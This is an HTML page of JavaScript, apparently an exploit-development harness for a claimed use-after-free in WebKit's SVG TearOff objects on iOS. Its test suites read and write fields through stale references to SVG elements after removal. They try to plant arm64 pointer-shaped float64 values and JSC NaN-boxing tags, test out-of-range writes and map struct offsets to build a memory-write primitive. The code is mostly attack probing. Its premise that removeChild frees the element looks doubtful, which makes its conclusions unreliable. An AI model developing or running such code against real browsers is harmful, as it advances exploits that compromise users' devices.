<style>

<body>
<h1>SVGAnimatedLength UAF — v22</h1>
<h2>iOS 26.5.2 · SVGMatrix float64 TearOff · 8-byte write · arm64 ptr range</h2>

<div class="suite">
<div class="suite-title">Controls</div>
<button id="run-all" onclick="runAll()">▶ Run All</button>
<button onclick="run('MTX')">MTX</button>
<button onclick="run('ANM')">ANM</button>
<button onclick="run('ASP')">ASP</button>
<button onclick="run('PTH')">PTH</button>
<button id="copy-all" onclick="copyAll()">⎘ Copy All</button>
<button onclick="clearOut()">✕ Clear</button>
</div>

<div class="suite"><div class="suite-title">Results</div><div id="out"></div></div>

<script>
var NS='http://www.w3.org/2000/svg';

function log(msg,cls){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(cls||'info');
  e.textContent=msg;
  d.appendChild(e);
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function runAll(){clearOut();runMTX();runANM();runASP();runPTH();}
function run(s){clearOut();
  if(s==='MTX')runMTX();
  else if(s==='ANM')runANM();
  else if(s==='ASP')runASP();
  else if(s==='PTH')runPTH();
}

// float64 bit utils — full 8-byte precision
var _f64buf=new ArrayBuffer(8);
var _f64v=new Float64Array(_f64buf);
var _u32v_hi=new Uint32Array(_f64buf);  // hi/lo uint32 pairs
function f64toHex(f){
  _f64v[0]=f;
  var lo=_u32v_hi[0],hi=_u32v_hi[1];
  return '0x'+hi.toString(16).padStart(8,'0')+'_'+lo.toString(16).padStart(8,'0');
}
function f64toBigBits(f){
  _f64v[0]=f;
  return {hi:_u32v_hi[1],lo:_u32v_hi[0]};
}
function bitsToF64(hi,lo){
  _u32v_hi[1]=hi;_u32v_hi[0]=lo;
  return _f64v[0];
}
function f64IsNormal(f){return isFinite(f)&&f!==0;}

// float32 bits (for comparison)
var _f32buf=new ArrayBuffer(4);
var _f32v=new Float32Array(_f32buf);
var _u32v=new Uint32Array(_f32buf);
function bitsF32(u){_u32v[0]=u;return _f32v[0];}

function makeSVG(){
  var svg=document.createElementNS(NS,'svg');
  svg.setAttribute('width','1');svg.setAttribute('height','1');
  svg.style.cssText='position:absolute;left:-9999px;top:-9999px';
  document.body.appendChild(svg);
  return svg;
}

// ─── MTX: SVGMatrix TEAROFF UAF ─────────────────────────────────────────────
// SVGGraphicsElement.transform.baseVal is an SVGTransformList TearOff
// getItem(0) returns an SVGTransform TearOff
// .matrix returns an SVGMatrix (DOMMatrix) with float64 fields: a,b,c,d,e,f
//
// Key questions:
// 1. Does the matrix TearOff retain a dangling ptr after removeChild? (UAF possible)
// 2. Are the matrix fields float64 (8 bytes) or float32? (determines write power)
// 3. Does NaN/Inf write get rejected? (much looser than SVGLength)
// 4. What struct offsets do the matrix fields correspond to?
// 5. Can we write arm64 pointer values (0x0001xxxxxxxxx) exactly?

function runMTX(){
  log('══ MTX: SVGMatrix FLOAT64 TEAROFF ═══════════════','info');

  // MTX-1: Basic SVGMatrix TearOff UAF — does it survive removeChild?
  log('MTX[1]: SVGMatrix TearOff — survives after removeChild?','info');
  var svg1=makeSVG();
  var rect=document.createElementNS(NS,'rect');
  rect.setAttribute('x','0');rect.setAttribute('y','0');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  svg1.appendChild(rect);

  // Apply a transform so the transform list has an item
  rect.setAttribute('transform','matrix(1 0 0 1 0 0)');

  var tfList=rect.transform.baseVal;
  var tfItem=tfList.numberOfItems>0?tfList.getItem(0):null;
  log('MTX[1]: transform list items='+tfList.numberOfItems,(tfItem?'info':'warn'));

  if(!tfItem){
    // No transform item — create one via consolidate or append
    var svgMatrix=svg1.createSVGMatrix?svg1.createSVGMatrix():null;
    if(svgMatrix){
      var newTF=svg1.createSVGTransform?svg1.createSVGTransform():null;
      if(newTF){newTF.setMatrix(svgMatrix);tfList.appendItem(newTF);}
    }
    if(tfList.numberOfItems>0)tfItem=tfList.getItem(0);
    log('MTX[1]: created transform item, count='+tfList.numberOfItems,'info');
  }

  if(!tfItem){log('MTX[1]: no transform item available','fail');svg1.remove();return;}

  var mx=tfItem.matrix;
  log('MTX[1]: baseline matrix a='+mx.a+' b='+mx.b+' c='+mx.c+' d='+mx.d+' e='+mx.e+' f='+mx.f,'info');
  log('MTX[1]: matrix a bits='+f64toHex(mx.a),'info');

  // FREE the rect
  svg1.removeChild(rect);
  log('MTX[1]: rect removed (freed)','info');

  // Try to read matrix fields after free
  var aAfter=null,bAfter=null,cAfter=null;
  try{aAfter=mx.a;log('MTX[1]: matrix.a after free='+aAfter+' bits='+f64toHex(aAfter),(aAfter!==null?'star':'warn'));}
  catch(e){log('MTX[1]: matrix.a read err: '+e.message,'fail');}
  try{bAfter=mx.b;log('MTX[1]: matrix.b after free='+bAfter,'star');}catch(e){log('MTX[1]: matrix.b err: '+e.message,'fail');}
  try{cAfter=mx.c;log('MTX[1]: matrix.c after free='+cAfter,'star');}catch(e){log('MTX[1]: matrix.c err: '+e.message,'fail');}

  // Try to WRITE to matrix fields after free
  log('MTX[1]: attempting UAF write to matrix.a...','info');
  var writeOk=false;
  try{
    mx.a=2.718281828;
    var rb=mx.a;
    writeOk=true;
    log('MTX[1]: matrix.a UAF write(2.718281828) ok=true readback='+rb,(Math.abs(rb-2.718281828)<1e-10?'crit':'star'));
    log('MTX[1]: precision: '+(rb===2.718281828?'EXACT float64 (8 bytes)':'float32 precision loss '+(rb))
      ,(rb===2.718281828?'crit':'info'));
  }catch(e){log('MTX[1]: matrix.a write err: '+e.message,'fail');}

  if(writeOk){
    // MTX-1b: test all 6 matrix fields
    log('MTX[1b]: test all 6 matrix fields','info');
    var fields=['a','b','c','d','e','f'];
    var vals=[Math.PI,Math.E,1.41421356,1.61803399,2.71828183,3.14159265];
    fields.forEach(function(f,i){
      try{
        mx[f]=vals[i];
        var rb=mx[f];
        var exact=(rb===vals[i]);
        log('MTX[1b]: matrix.'+f+'='+vals[i]+' readback='+rb+' exact='+exact,
          (exact?'crit':'star'));
      }catch(e){log('MTX[1b]: matrix.'+f+' err: '+e.message,'fail');}
    });
  }
  svg1.remove();

  // MTX-2: NaN/Inf rejection test for SVGMatrix
  log('MTX[2]: NaN/Inf rejection — SVGMatrix vs SVGLength','info');
  var svg2=makeSVG();
  var rect2=document.createElementNS(NS,'rect');
  rect2.setAttribute('transform','matrix(1 0 0 1 0 0)');
  svg2.appendChild(rect2);
  var mx2=rect2.transform.baseVal.getItem(0).matrix;
  svg2.removeChild(rect2); // FREE

  var specialVals=[
    {name:'NaN',v:NaN},
    {name:'Inf',v:Infinity},
    {name:'-Inf',v:-Infinity},
    {name:'float64_NaN',v:bitsToF64(0x7FF80000,0x00000000)},
    {name:'ptr_shaped_lo',v:bitsToF64(0x00000001,0x80000000)}, // arm64-like ptr lo
    {name:'ptr_arm64',v:bitsToF64(0x00000001,0x00106000)},    // 0x000000010006000
    {name:'jsctag',v:bitsToF64(0xFFFF0000,0x00000000)},       // JSC NaN-boxing tag
    {name:'float64_max',v:Number.MAX_VALUE},
    {name:'float64_min',v:Number.MIN_VALUE},
    {name:'large_but_finite',v:1e308},
  ];
  specialVals.forEach(function(t){
    try{
      mx2.a=t.v;
      var rb=mx2.a;
      var bits=f64toBigBits(rb);
      log('MTX[2]: ['+t.name+'] write ok rb='+rb+' bits='+f64toHex(rb),
        (isNaN(t.v)||!isFinite(t.v)?'crit':'star'));
    }catch(e){
      log('MTX[2]: ['+t.name+'] write REJECTED: '+e.message,'warn');
    }
  });
  svg2.remove();

  // MTX-3: pointer-valued write test
  // arm64e user-space pointer format: 0x0001xxxxxxxx (high byte = 0x00 or 0x01)
  // As float64: 0x0001xxxxxxxx → very small positive number (denorm or small normal)
  // Example: address 0x000180010000 → as float64 bits 0x000180010000 → ~4.3e-309 (denorm)
  log('MTX[3]: pointer-valued write test','info');
  var svg3=makeSVG();
  var rect3=document.createElementNS(NS,'rect');
  rect3.setAttribute('transform','matrix(1 0 0 1 0 0)');
  svg3.appendChild(rect3);
  var mx3=rect3.transform.baseVal.getItem(0).matrix;
  svg3.removeChild(rect3); // FREE

  // These ARE valid float64 values (just very small, near denorm)
  var ptrTests=[
    {name:'heap_ptr_1',hi:0x00000001,lo:0x80000000},  // 0x0000000180000000
    {name:'heap_ptr_2',hi:0x00000001,lo:0x00100000},  // small heap addr
    {name:'heap_ptr_3',hi:0x00000001,lo:0xFACEC0DE},  // canary with heap hi
    {name:'stack_ptr',hi:0x00000001,lo:0x6FB20000},   // stack-ish
    {name:'dylib_ptr',hi:0x00000001,lo:0xD0000000},   // dylib range
    {name:'all_ff',hi:0xFFFFFFFF,lo:0xFFFFFFFF},      // max bits (NaN territory)
    {name:'jsc_obj_tag',hi:0xFFFF0000,lo:0xDEADBEEF}, // JSC NaN-box object
  ];
  ptrTests.forEach(function(t){
    var f=bitsToF64(t.hi,t.lo);
    try{
      mx3.a=f;
      var rb=mx3.a;
      var rbBits=f64toBigBits(rb);
      var hiMatch=(rbBits.hi===t.hi),loMatch=(rbBits.lo===t.lo);
      log('MTX[3]: ['+t.name+'] hi=0x'+t.hi.toString(16)+' lo=0x'+t.lo.toString(16)+
        ' → write ok, rb_hi=0x'+rbBits.hi.toString(16)+' rb_lo=0x'+rbBits.lo.toString(16)+
        (hiMatch&&loMatch?' EXACT ROUNDTRIP':''),
        (hiMatch&&loMatch?'crit':(!isNaN(rb)?'star':'warn')));
    }catch(e){
      log('MTX[3]: ['+t.name+'] REJECTED: '+e.message,'warn');
    }
  });
  svg3.remove();

  // MTX-4: read raw field values from freshly freed transform matrix
  // Create rect WITHOUT setting a transform → transform list is EMPTY
  // Then add transform after, free rect, and see what the matrix fields read
  // This might expose C++ padding/pointer values at non-initialized offsets
  log('MTX[4]: raw struct read from freshly freed matrix','info');
  var svg4=makeSVG();
  var rect4=document.createElementNS(NS,'rect');
  svg4.appendChild(rect4);
  // Give it an identity transform
  var svgTF=document.createElementNS(NS,'rect');
  rect4.setAttribute('transform','translate(100, 200)');
  var tfList4=rect4.transform.baseVal;
  var item4=tfList4.getItem(0);
  var mx4=item4.matrix;
  log('MTX[4]: pre-free translate matrix: e='+mx4.e+' f='+mx4.f,'info');
  log('MTX[4]: pre-free bits e='+f64toHex(mx4.e)+' f='+f64toHex(mx4.f),'info');
  svg4.removeChild(rect4); // FREE
  // Read all 6 fields from freed matrix
  var fields4=['a','b','c','d','e','f'];
  fields4.forEach(function(fld){
    try{
      var v=mx4[fld];
      var bits=f64toBigBits(v);
      log('MTX[4]: freed matrix.'+fld+'='+v+' bits='+f64toHex(v)+
        (bits.hi>0x0000FFFF?' ← POINTER-SHAPED':bits.hi===0&&bits.lo===0?' ← ZERO':''),
        (bits.hi>0x0000FFFF?'crit':'info'));
    }catch(e){log('MTX[4]: matrix.'+fld+' err: '+e.message,'fail');}
  });
  svg4.remove();
}

// ─── ANM: SMIL ANIMATION + UAF ──────────────────────────────────────────────
// During SMIL animation, animVal reads m_animVal.m_value (different from m_baseVal.m_value)
// Goal: get TearOff to BOTH baseVal and animVal, free parent element,
// check if they now read DIFFERENT C++ struct offsets

function runANM(){
  log('══ ANM: SMIL ANIMATION TEAROFF OFFSETS ══════════','info');

  // ANM-1: baseVal vs animVal during active SMIL
  log('ANM[1]: active SMIL — do baseVal and animVal read different freed offsets?','info');
  var svg1=makeSVG();
  var rect=document.createElementNS(NS,'rect');
  rect.setAttribute('x','50');rect.setAttribute('y','0');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  // Add SMIL animation
  var anim=document.createElementNS(NS,'animate');
  anim.setAttribute('attributeName','x');
  anim.setAttribute('from','50');anim.setAttribute('to','150');
  anim.setAttribute('dur','100s');anim.setAttribute('fill','freeze');
  rect.appendChild(anim);
  svg1.appendChild(rect);

  // Grab both TearOffs BEFORE free
  var bvX=rect.x.baseVal;
  var avX=rect.x.animVal;
  log('ANM[1]: baseline baseVal.x='+bvX.value+' animVal.x='+avX.value,'info');
  // During animation at t=0, animVal should read from m_animVal field
  // while baseVal reads from m_baseVal field
  var bvBits=null,avBits=null;
  _f32v[0]=bvX.value;bvBits=_u32v[0];
  _f32v[0]=avX.value;avBits=_u32v[0];
  log('ANM[1]: baseVal bits=0x'+bvBits.toString(16)+' animVal bits=0x'+avBits.toString(16),'info');

  // FREE the rect (animation still running?)
  svg1.removeChild(rect);
  log('ANM[1]: rect freed (animation was active)','info');

  // Read both after free
  var bvAfter=null,avAfter=null;
  try{bvAfter=bvX.value;_f32v[0]=bvAfter;
    log('ANM[1]: baseVal after free='+bvAfter+' bits=0x'+_u32v[0].toString(16),'star');}
  catch(e){log('ANM[1]: baseVal err: '+e.message,'fail');}
  try{avAfter=avX.value;_f32v[0]=avAfter;
    log('ANM[1]: animVal after free='+avAfter+' bits=0x'+_u32v[0].toString(16),'star');}
  catch(e){log('ANM[1]: animVal err: '+e.message,'fail');}

  // Are they DIFFERENT? If so, we have two write sites at different offsets
  var different=(bvAfter!==avAfter);
  log('ANM[1]: baseVal==animVal='+(bvAfter===avAfter)+
    (different?' ← DIFFERENT FIELDS = two distinct write sites':'← same field (expected without active anim)'),
    (different?'crit':'info'));

  // Write to baseVal, then read animVal — do they cross-talk?
  if(bvAfter!==null){
    bvX.value=999;
    var avRb=null;
    try{avRb=avX.value;}catch(e){}
    log('ANM[1]: write(bv=999) → animVal reads='+avRb,
      (avRb===999?'info — same field':avRb!==null?'crit — DIFFERENT FIELD, avRb='+avRb:'fail')
      ,(avRb!==999&&avRb!==null?'crit':'info'));
  }
  svg1.remove();

  // ANM-2: SVGAnimatedLength.animVal field offset exploration
  // When NO animation is active: animVal mirrors baseVal (same field)
  // When animation IS active: animVal reads from m_animatedValue (a separate SVGLength)
  // So: set up animation, don't start it yet, free element, check if animVal reads different
  log('ANM[2]: paused animation — does animVal isolate from baseVal?','info');
  var svg2=makeSVG();
  var r2=document.createElementNS(NS,'rect');
  r2.setAttribute('x','11');r2.setAttribute('y','22');
  r2.setAttribute('width','100');r2.setAttribute('height','100');
  // Add animation but DON'T start it (begin='indefinite')
  var anim2=document.createElementNS(NS,'animate');
  anim2.setAttribute('attributeName','x');
  anim2.setAttribute('from','11');anim2.setAttribute('to','999');
  anim2.setAttribute('dur','10s');anim2.setAttribute('begin','indefinite');
  r2.appendChild(anim2);
  svg2.appendChild(r2);

  var bv2=r2.x.baseVal;
  var av2=r2.x.animVal;
  r2.x;  // force TearOff creation
  log('ANM[2]: before anim start: bv='+bv2.value+' av='+av2.value,'info');
  // Start animation (begin)
  anim2.beginElement();
  log('ANM[2]: anim started, av='+av2.value,'info');
  // Free immediately after start
  svg2.removeChild(r2);
  var bv2a=null,av2a=null;
  try{bv2a=bv2.value;log('ANM[2]: bv after free='+bv2a,'star');}catch(e){}
  try{av2a=av2.value;log('ANM[2]: av after free='+av2a,'star');}catch(e){}
  log('ANM[2]: separate fields='+(bv2a!==av2a),(bv2a!==av2a?'crit':'info'));
  svg2.remove();
}

// ─── ASP: SVGPreserveAspectRatio TEAROFF ────────────────────────────────────
// SVGImageElement.preserveAspectRatio.baseVal returns SVGPreserveAspectRatio TearOff
// Fields: .align (uint16, 1-10) and .meetOrSlice (uint16, 1-2)
// This TearOff reads DIFFERENT struct offsets than SVGLength
// And reads UINT16 values, not float — might expose ptr halves

function runASP(){
  log('══ ASP: SVGPreserveAspectRatio TEAROFF ══════════','info');

  // ASP-1: Basic TearOff UAF test
  log('ASP[1]: SVGPreserveAspectRatio TearOff UAF','info');
  var svg1=makeSVG();
  var img=document.createElementNS(NS,'image');
  img.setAttribute('x','0');img.setAttribute('y','0');
  img.setAttribute('width','100');img.setAttribute('height','100');
  img.setAttribute('href','data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==');
  svg1.appendChild(img);

  var par=img.preserveAspectRatio;
  var parBase=par.baseVal;
  log('ASP[1]: baseline align='+parBase.align+' meetOrSlice='+parBase.meetOrSlice,'info');

  svg1.removeChild(img); // FREE

  var alignAfter=null,mosAfter=null;
  try{alignAfter=parBase.align;log('ASP[1]: align after free='+alignAfter,(alignAfter!==null?'star':'warn'));}
  catch(e){log('ASP[1]: align err: '+e.message,'fail');}
  try{mosAfter=parBase.meetOrSlice;log('ASP[1]: meetOrSlice after free='+mosAfter,(mosAfter!==null?'star':'warn'));}
  catch(e){log('ASP[1]: meetOrSlice err: '+e.message,'fail');}

  // ASP-2: UAF write — can we set align/meetOrSlice to arbitrary values?
  if(alignAfter!==null){
    log('ASP[2]: UAF write to align/meetOrSlice','info');
    try{
      parBase.align=9;
      log('ASP[2]: write align=9 readback='+parBase.align,(parBase.align===9?'pass':'warn'));
    }catch(e){log('ASP[2]: align write err: '+e.message,'fail');}
    try{
      parBase.meetOrSlice=2;
      log('ASP[2]: write meetOrSlice=2 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===2?'pass':'warn'));
    }catch(e){log('ASP[2]: meetOrSlice write err: '+e.message,'fail');}

    // Can we write OUT OF RANGE values?
    // Valid align: 1-9 (SVG_PRESERVEASPECTRATIO_XMINYMIN=1 ... SVG_PRESERVEASPECTRATIO_XMAXYMAX=9)
    // Valid meetOrSlice: 1-2
    // If WebKit doesn't bounds-check: out-of-range uint16 values can be written
    log('ASP[2]: OOB write — align=255, meetOrSlice=255','info');
    try{
      parBase.align=255;
      log('ASP[2]: OOB align=255 readback='+parBase.align,(parBase.align===255?'crit':'info'));
    }catch(e){log('ASP[2]: OOB align err: '+e.message,'warn');}
    try{
      parBase.meetOrSlice=255;
      log('ASP[2]: OOB mos=255 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===255?'crit':'info'));
    }catch(e){log('ASP[2]: OOB mos err: '+e.message,'warn');}
    // Negative/large values
    try{
      parBase.align=0xFFFF;
      log('ASP[2]: align=0xFFFF readback='+parBase.align,'star');
    }catch(e){log('ASP[2]: align=0xFFFF err: '+e.message,'info');}
    try{
      parBase.align=0x1234;
      log('ASP[2]: align=0x1234 readback='+parBase.align,'star');
    }catch(e){log('ASP[2]: align=0x1234 err: '+e.message,'info');}
  }
  svg1.remove();

  // ASP-3: SVGSVGElement.preserveAspectRatio — on root svg element
  log('ASP[3]: SVGSVGElement.preserveAspectRatio TearOff','info');
  var svg3=document.createElementNS(NS,'svg');
  var parentSVG=makeSVG();
  parentSVG.appendChild(svg3);
  var par3=svg3.preserveAspectRatio;
  var base3=par3.baseVal;
  log('ASP[3]: baseline align='+base3.align+' mos='+base3.meetOrSlice,'info');
  parentSVG.removeChild(svg3); // FREE
  var a3=null,m3=null;
  try{a3=base3.align;log('ASP[3]: align after free='+a3,'star');}catch(e){log('ASP[3]: align err: '+e.message,'fail');}
  try{m3=base3.meetOrSlice;log('ASP[3]: mos after free='+m3,'star');}catch(e){log('ASP[3]: mos err: '+e.message,'fail');}
  parentSVG.remove();
}

// ─── PTH: SVGPathElement TEAROFF ────────────────────────────────────────────
// SVGPathElement.pathLength.baseVal — returns SVGAnimatedLength (same as rect)
// BUT: does SVGPathElement's SVGAnimatedLength m_pathLength happen to be at
// a DIFFERENT struct offset than SVGRectElement's m_x?
// Goal: probe if SVGPathElement gives a different write offset (closer to vtable)
//
// Also: SVGPathElement.pathSegList — returns SVGPathSegList TearOff
// pathSegList.getItem(0) → SVGPathSeg TearOff with float fields (x,y coordinates)
// This might read float64 or float32 at yet another struct offset

function runPTH(){
  log('══ PTH: SVGPathElement TEAROFF PROBE ════════════','info');

  // PTH-1: SVGPathElement.pathLength UAF
  log('PTH[1]: pathLength TearOff on freed SVGPathElement','info');
  var svg1=makeSVG();
  var path=document.createElementNS(NS,'path');
  path.setAttribute('d','M 10 20 L 30 40');
  path.setAttribute('pathLength','100');
  svg1.appendChild(path);
  var pl=path.pathLength;
  var plBase=pl.baseVal;
  log('PTH[1]: pathLength.baseVal='+plBase.value,'info');
  svg1.removeChild(path); // FREE
  var plAfter=null;
  try{plAfter=plBase.value;log('PTH[1]: pathLength after free='+plAfter,(plAfter!==null?'star':'warn'));}
  catch(e){log('PTH[1]: pathLength err: '+e.message,'fail');}
  // UAF write
  if(plAfter!==null){
    try{
      plBase.value=9999;
      log('PTH[1]: UAF write(9999) readback='+plBase.value,'crit');
      _f32v[0]=plBase.value;
      log('PTH[1]: write bits=0x'+_u32v[0].toString(16),'star');
    }catch(e){log('PTH[1]: write err: '+e.message,'fail');}
  }
  svg1.remove();

  // PTH-2: SVGPathSeg — path segment TearOff
  // path.pathSegList.getItem(0) returns SVGPathSegMovetoAbs with .x and .y (float32)
  // If this gives a UAF, it reads a DIFFERENT struct (SVGPathSegData or similar)
  log('PTH[2]: SVGPathSeg TearOff UAF probe','info');
  var svg2=makeSVG();
  var path2=document.createElementNS(NS,'path');
  path2.setAttribute('d','M 10 20 L 30 40 Z');
  svg2.appendChild(path2);

  // Note: pathSegList is deprecated but may still work in WebKit
  var psl=path2.pathSegList||path2.animatedPathSegList;
  if(psl&&psl.numberOfItems>0){
    var seg0=psl.getItem(0);
    log('PTH[2]: seg[0] type='+seg0.pathSegTypeAsLetter+' x='+seg0.x+' y='+seg0.y,'info');
    svg2.removeChild(path2); // FREE
    var sx=null,sy=null;
    try{sx=seg0.x;log('PTH[2]: seg.x after free='+sx,(sx!==null?'star':'warn'));}
    catch(e){log('PTH[2]: seg.x err: '+e.message,'fail');}
    try{sy=seg0.y;log('PTH[2]: seg.y after free='+sy,(sy!==null?'star':'warn'));}
    catch(e){log('PTH[2]: seg.y err: '+e.message,'fail');}
    if(sx!==null){
      try{
        seg0.x=8888;
        log('PTH[2]: UAF write seg.x=8888 readback='+seg0.x,'crit');
      }catch(e){log('PTH[2]: seg.x write err: '+e.message,'fail');}
    }
  }else{
    log('PTH[2]: pathSegList unavailable (deprecated), trying getPathData','warn');
    // Fallback: getTotalLength gives a float64 result about the path
    var tl=path2.getTotalLength?path2.getTotalLength():null;
    log('PTH[2]: getTotalLength='+tl,'info');
    svg2.removeChild(path2);
  }
  svg2.remove();

  // PTH-3: SVGTextElement coordinate TearOff — reads getStartPositionOfChar
  // SVGTextContentElement.getStartPositionOfChar(0) returns DOMPoint (float64 x,y)
  // This is a COMPUTED value, not a TearOff. But let's check if it reads freed state.
  log('PTH[3]: SVGTextElement getStartPositionOfChar after free','info');
  var svg3=makeSVG();
  svg3.setAttribute('width','200');svg3.setAttribute('height','200');
  svg3.style.cssText='position:absolute;left:-9999px;top:-9999px';
  var text=document.createElementNS(NS,'text');
  text.setAttribute('x','10');text.setAttribute('y','20');
  text.textContent='ABC';
  svg3.appendChild(text);
  document.body.appendChild(svg3);
  var startPos=null;
  try{startPos=text.getStartPositionOfChar(0);}catch(e){}
  if(startPos){log('PTH[3]: getStartPositionOfChar(0) x='+startPos.x+' y='+startPos.y,'info');}
  // Grab x TearOff before free
  var textXBase=text.x.baseVal;
  svg3.removeChild(text);
  var txAfter=null;
  try{txAfter=textXBase.value;log('PTH[3]: text.x after free='+txAfter,'star');}
  catch(e){log('PTH[3]: text.x err: '+e.message,'fail');}
  if(txAfter!==null){
    try{
      textXBase.value=12345;
      log('PTH[3]: text.x UAF write=12345 readback='+textXBase.value,'crit');
    }catch(e){log('PTH[3]: text.x write err: '+e.message,'fail');}
  }
  svg3.remove();

  // PTH-4: SVGSVGElement coordinate TearOff — nested SVG (x,y are lengths)
  // SVGSVGElement.x.baseVal — is THIS at a different struct offset?
  log('PTH[4]: nested SVGSVGElement coordinate TearOff','info');
  var svg4=makeSVG();
  var innerSVG=document.createElementNS(NS,'svg');
  innerSVG.setAttribute('x','55');innerSVG.setAttribute('y','66');
  innerSVG.setAttribute('width','77');innerSVG.setAttribute('height','88');
  svg4.appendChild(innerSVG);
  var isvgX=innerSVG.x.baseVal;
  var isvgY=innerSVG.y.baseVal;
  svg4.removeChild(innerSVG); // FREE
  var ix=null,iy=null;
  try{ix=isvgX.value;log('PTH[4]: inner svg.x after free='+ix,(ix===55?'star':'warn'));}
  catch(e){log('PTH[4]: svg.x err: '+e.message,'fail');}
  try{iy=isvgY.value;log('PTH[4]: inner svg.y after free='+iy,(iy===66?'star':'warn'));}
  catch(e){log('PTH[4]: svg.y err: '+e.message,'fail');}
  // UAF write to inner svg
  if(ix!==null){
    try{isvgX.value=9876;log('PTH[4]: inner svg UAF write ok, x='+isvgX.value,'crit');}
    catch(e){log('PTH[4]: inner svg write err: '+e.message,'fail');}
  }
  svg4.remove();

  // PTH-5: SVGMatrix UAF FIELD COMPARISON
  // If MTX confirmed float64, compare the float64 matrix.a vs SVGLength float32 x
  // by writing BOTH on the same freed element and reading back
  // This lets us confirm they read DIFFERENT offsets in the same freed struct
  log('PTH[5]: SVGMatrix vs SVGLength — compare offsets on same freed element','info');
  var svg5=makeSVG();
  var r5=document.createElementNS(NS,'rect');
  r5.setAttribute('x','10');r5.setAttribute('y','20');
  r5.setAttribute('width','30');r5.setAttribute('height','40');
  r5.setAttribute('transform','matrix(1 0 0 1 50 60)');
  svg5.appendChild(r5);
  // Grab ALL TearOffs before free
  var tfX=r5.x.baseVal;
  var tfY=r5.y.baseVal;
  var mxTF=null;
  try{mxTF=r5.transform.baseVal.getItem(0).matrix;}catch(e){}
  svg5.removeChild(r5); // FREE both SVGLength AND SVGMatrix TearOffs simultaneously
  // Read both
  var xAfter=null,mxA=null,mxE=null;
  try{xAfter=tfX.value;log('PTH[5]: x.baseVal after free='+xAfter,'star');}catch(e){}
  try{mxA=mxTF&&mxTF.a;log('PTH[5]: matrix.a after free='+mxA,(mxA!==null?'star':'warn'));}catch(e){log('PTH[5]: matrix.a err: '+(e&&e.message),'fail');}
  try{mxE=mxTF&&mxTF.e;log('PTH[5]: matrix.e after free='+mxE,(mxE!==null?'star':'warn'));}catch(e){}
  // Write to both — if they're at different offsets, one write shouldn't corrupt the other
  if(xAfter!==null&&mxTF){
    try{tfX.value=111;mxTF.a=2.222;
      log('PTH[5]: write x=111 and matrix.a=2.222','info');
      log('PTH[5]: readback x='+tfX.value+' matrix.a='+mxTF.a,
        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'star'));
      log('PTH[5]: independent offsets='+(tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10),
        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'warn'));
    }catch(e){log('PTH[5]: write err: '+e.message,'fail');}
  }
  svg5.remove();
}
</script>
</body>
</html>
